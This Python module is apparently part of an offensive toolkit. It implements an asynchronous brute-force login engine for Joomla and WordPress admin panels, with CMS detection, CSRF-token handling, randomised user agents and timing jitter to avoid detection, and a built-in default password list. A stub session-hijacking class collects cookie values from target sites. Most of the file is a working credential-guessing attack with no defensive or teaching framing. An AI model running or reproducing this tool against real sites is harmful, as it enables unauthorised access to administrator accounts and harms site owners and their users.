"""Authentication Attacks - Brute Force, Session Hijacking, JWT."""
import asyncio, re, base64, random, time, json
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin
import aiohttp
from bs4 import BeautifulSoup
from ..utils.helpers import status, random_ua

DEFAULT_PASSWORDS = [
    "admin","admin123","password","123456","administrator",
    "joomla","abc123","napoli","root","test","demo",
    "guest","user","manager","qwerty","letmein",
]

class BruteForcer:
    """Multi-protocol brute force engine."""

    def __init__(self, target: str, concurrency: int = 5, delay: float = 0.5):
        self.target = target.rstrip("/")
        self.admin_url = f"{self.target}/administrator/"
        self.concurrency = concurrency
        self.delay = delay
        self.sem = asyncio.Semaphore(concurrency)
        self.successes = []
        self.attempts = 0
        self.cms = "unknown"

    async def detect_cms(self):
        """Detect CMS type for targeted attack."""
        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            try:
                resp = await s.get(self.target, headers=headers, timeout=10, ssl=False)
                html = await resp.text()
                if "joomla" in html.lower() or "/administrator" in html:
                    self.cms = "joomla"
                elif "wp-content" in html or "wp-admin" in html:
                    self.cms = "wordpress"
                elif "drupal" in html.lower():
                    self.cms = "drupal"
                status(f"CMS detected: {self.cms}", "info")
            except: pass

    async def _joomla_login(self, session, username: str, password: str) -> Optional[dict]:
        """Joomla login attempt."""
        async with self.sem:
            await asyncio.sleep(self.delay + random.uniform(0, 0.5))
            headers = {"User-Agent": random_ua(), "Accept": "text/html"}

            try:
                # Get CSRF token
                resp = await session.get(self.admin_url, headers=headers, timeout=10, ssl=False)
                html = await resp.text()
                cookies = str(resp.cookies)

                token_match = re.search(r'name="([a-f0-9]{32})"', html)
                if not token_match:
                    return None
                token = token_match.group(1)

                # Login
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Referer"] = self.admin_url
                headers["Cookie"] = cookies

                data = {
                    "username": username,
                    "passwd": password,
                    "option": "com_login",
                    "task": "login",
                    "return": base64.b64encode(b"index.php").decode(),
                    token: "1",
                }

                resp = await session.post(
                    f"{self.admin_url}index.php",
                    headers=headers, data=data,
                    timeout=10, ssl=False, allow_redirects=False,
                )

                self.attempts += 1

                if resp.status in [301, 302, 303]:
                    loc = resp.headers.get("Location", "")
                    if "administrator" in loc and "login" not in loc.lower():
                        return {"username": username, "password": password, "cms": "joomla"}

                # Check for control panel in 200
                if resp.status == 200:
                    html = await resp.text()
                    if "control-panel" in html.lower() or "cpanel" in html.lower():
                        return {"username": username, "password": password, "cms": "joomla"}

            except: pass
        return None

    async def _wp_login(self, session, username: str, password: str) -> Optional[dict]:
        """WordPress login attempt."""
        async with self.sem:
            await asyncio.sleep(self.delay + random.uniform(0, 0.5))
            wp_login = f"{self.target}/wp-login.php"
            headers = {"User-Agent": random_ua(), "Content-Type": "application/x-www-form-urlencoded"}

            try:
                data = {"log": username, "pwd": password, "wp-submit": "Log In", "redirect_to": f"{self.target}/wp-admin/", "testcookie": "1"}
                resp = await session.post(wp_login, headers=headers, data=data, timeout=10, ssl=False, allow_redirects=False)
                self.attempts += 1

                if resp.status in [301, 302] and "wp-admin" in resp.headers.get("Location", ""):
                    return {"username": username, "password": password, "cms": "wordpress"}
            except: pass
        return None

    async def attack(self, usernames: list, passwords: list) -> list:
        """Run brute force attack."""
        await self.detect_cms()

        status(f"Brute force: {len(usernames)} users x {len(passwords)} passwords", "info")
        status(f"Target: {self.admin_url}", "info")

        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            tasks = []
            for u in usernames:
                for p in passwords:
                    if self.cms == "joomla":
                        tasks.append(self._joomla_login(s, u.strip(), p.strip()))
                    elif self.cms == "wordpress":
                        tasks.append(self._wp_login(s, u.strip(), p.strip()))

            results = []
            done_count = 0
            for coro in asyncio.as_completed(tasks):
                result = await coro
                done_count += 1
                if result:
                    results.append(result)
                    status(f"FOUND: {result['username']}:{result['password']}", "critical")
                    break  # Stop on first success
                if done_count % 10 == 0:
                    status(f"Progress: {done_count}/{len(tasks)} attempts", "info")

        status(f"Complete: {len(results)} success(es), {self.attempts} attempts", "success")
        return results


class SessionHijacker:
    """Session hijacking via cookie theft/analysis."""

    @staticmethod
    async def analyze_cookies(url: str) -> list:
        """Analyze cookies for security issues."""
        findings = []
        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            try:
                resp = await s.get(url, headers=headers, timeout=10, ssl=False)
                for cookie_name, cookie in resp.cookies.items():
                    # Check for HttpOnly
                    # Check for Secure flag
                    # This requires cookie jar inspection
                    findings.append({"cookie": cookie_name, "value_preview": str(cookie.value)[:20]})
            except: pass
        return findings
